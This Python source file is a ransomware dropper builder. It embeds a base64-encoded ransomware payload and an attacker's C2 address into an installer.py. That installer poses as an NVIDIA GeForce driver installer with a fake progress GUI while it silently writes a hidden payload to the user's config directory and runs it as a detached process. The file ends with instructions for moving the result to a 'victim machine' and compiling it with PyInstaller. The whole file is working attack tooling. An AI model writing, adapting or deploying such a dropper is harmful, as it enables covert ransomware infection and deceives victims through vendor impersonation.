import base64
import os
import sys

# --- Configuration ---
# You can change this IP to your C2 server's IP (e.g., 192.168.x.x)
DEFAULT_C2_IP = "127.0.0.1" 
DEFAULT_C2_PORT = "5000"

def build_dropper():
    print("[-] Starting Builder...")
    
    # Paths
    current_dir = os.path.dirname(os.path.abspath(__file__))
    victim_dir = current_dir
    attacker_dir = os.path.join(current_dir, "..", "attacker")
    
    payload_path = os.path.join(victim_dir, "ransomware.py")
    key_path = os.path.join(attacker_dir, "attacker_public_key.pem")
    output_path = os.path.join(victim_dir, "installer.py")

    # 1. Read Ransomware Payload
    if not os.path.exists(payload_path):
        print(f"[!] Error: Payload not found at {payload_path}")
        return

    with open(payload_path, "r", encoding="utf-8") as f:
        payload_content = f.read()

    # 2. Read Public Key
    if not os.path.exists(key_path):
        print(f"[!] Error: Public key not found at {key_path}. Run c2_server.py first!")
        return

    with open(key_path, "r", encoding="utf-8") as f:
        public_key_clean = f.read()

    # 3. Inject Configuration (Dynamic Replacement)
    print("[-] Injecting Configuration...")
    
    # Replace Public Key
    # We look for the marker in ransomware.py or just regex/replace
    # The ransomware.py has: ATTACKER_PUBLIC_KEY = """..."""
    # We will do a robust replacement.
    
    # Construct the new key string
    new_key_str = f'ATTACKER_PUBLIC_KEY = """{public_key_clean}"""'
    
    # Find the block start
    start_marker = 'ATTACKER_PUBLIC_KEY = """'
    end_marker = '"""'
    
    # Simple replace is risky if there are multiple triple quotes. 
    # But given our file structure, we can assume the first occurrence is the config.
    # A safer way: standard string replacement if we know the exact placeholder, 
    # OR we just import the file? No, text processing is safer for cross-platform independent building.
    
    # Let's assume the user hasn't modified the structural markers in ransomware.py
    import re
    # Regex to replace the entire ATTACKER_PUBLIC_KEY block
    payload_content = re.sub(
        r'ATTACKER_PUBLIC_KEY = """.*?"""', 
        f'ATTACKER_PUBLIC_KEY = """{public_key_clean}"""', 
        payload_content, 
        flags=re.DOTALL
    )

    # Replace C2 URL
    # Ask user for IP? For automation, we'll use the variable or args.
    c2_ip = input(f"[?] Enter C2 Server IP [Default: {DEFAULT_C2_IP}]: ").strip()
    if not c2_ip: c2_ip = DEFAULT_C2_IP
    
    new_url = f'http://{c2_ip}:{DEFAULT_C2_PORT}'
    payload_content = re.sub(
        r'C2_SERVER_URL = ".*?"', 
        f'C2_SERVER_URL = "{new_url}"', 
        payload_content
    )
    
    print(f"[-] Configured Payload with C2: {new_url}")

    # 4. Base64 Encode the Modified Payload
    payload_b64 = base64.b64encode(payload_content.encode('utf-8')).decode('utf-8')

    # 5. Create Dropper (Installer)
    dropper_code = f'''import sys
import os
import base64
import subprocess
import threading
import time
import tempfile
import ctypes
from tkinter import Tk, Label, Button, ttk, PhotoImage, Frame

# --- CONFIGURATION ---
FAKE_TITLE = "NVIDIA GeForce Game Ready Driver Installer"
PAYLOAD_B64 = "{payload_b64}"
PAYLOAD_NAME = ".nvidia_update_helper.py"

def extract_and_execute_payload():
    """Drops the ransomware payload and executes it silently."""
    try:
        payload_data = base64.b64decode(PAYLOAD_B64)
        
        if os.name == 'nt':
            drop_dir = os.getenv('APPDATA')
            if not drop_dir: drop_dir = tempfile.gettempdir()
        else:
            drop_dir = os.path.expanduser("~/.config")
            if not os.path.exists(drop_dir):
                drop_dir = os.path.expanduser("~")
        
        drop_path = os.path.join(drop_dir, PAYLOAD_NAME)
        
        with open(drop_path, "wb") as f:
            f.write(payload_data)
            
        cmd = []
        if os.name == 'nt':
            cmd = ["python", drop_path]
        else:
            cmd = ["python3", drop_path]
            
        if os.name == 'nt':
            # Detach completely on Windows
            subprocess.Popen(cmd, creationflags=subprocess.CREATE_NO_WINDOW | subprocess.DETACHED_PROCESS)
        else:
            # Detach on Linux
            subprocess.Popen(cmd, start_new_session=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
            
    except Exception as e:
        pass

def fake_installer_gui():
    root = Tk()
    root.title(FAKE_TITLE)
    root.geometry("600x400")
    root.resizable(False, False)
    root.configure(bg="#1a1a1a")

    header = Frame(root, bg="#1a1a1a")
    header.pack(fill="x", pady=20)
    Label(header, text="NVIDIA", fg="#76b900", bg="#1a1a1a", font=("Segoe UI", 24, "bold")).pack()
    Label(header, text="Graphics Driver Installer", fg="white", bg="#1a1a1a", font=("Segoe UI", 16)).pack()

    content = Frame(root, bg="#1a1a1a")
    content.pack(expand=True, fill="both", padx=40)
    
    status_label = Label(content, text="Checking system compatibility...", fg="#cccccc", bg="#1a1a1a", font=("Segoe UI", 10))
    status_label.pack(anchor="w", pady=(20, 5))
    
    progress = ttk.Progressbar(content, orient="horizontal", length=520, mode="determinate")
    progress.pack(pady=10)

    def run_simulation():
        steps = [
            "Checking install options...", "Validating packages...", "Installing Graphics Driver...",
            "Installing HD Audio Driver...", "Installing PhysX System...", "Finalizing..."
        ]
        
        # DROP THE PAYLOAD EXECUTION HERE
        root.after(2000, extract_and_execute_payload)
        
        progress['maximum'] = 100
        current_val = 0
        
        for i, step in enumerate(steps):
            time.sleep(1.0) 
            status_label.config(text=step)
            root.update()
            
            target = int((i + 1) / len(steps) * 100)
            while current_val < target:
                current_val += 2
                progress['value'] = current_val
                time.sleep(0.02)
                root.update()
        
        time.sleep(1)
        root.destroy()

    threading.Thread(target=run_simulation, daemon=True).start()
    root.mainloop()

if __name__ == "__main__":
    fake_installer_gui()
'''

    with open(output_path, "w", encoding="utf-8") as f:
        f.write(dropper_code)

    print(f"[+] Dropper created successfully at: {output_path}")
    print(f"[+] Instructions:")
    print("    1. Move 'installer.py' to your victim machine.")
    print("    2. On Victim (Linux): pyinstaller --noconsole --onefile installer.py")
    print("    3. On Victim (Windows): pyinstaller --noconsole --onefile --icon=nvidia.ico installer.py")
    print("    4. If you don't use PyInstaller, just running 'python installer.py' works too!")

if __name__ == "__main__":
    build_dropper()
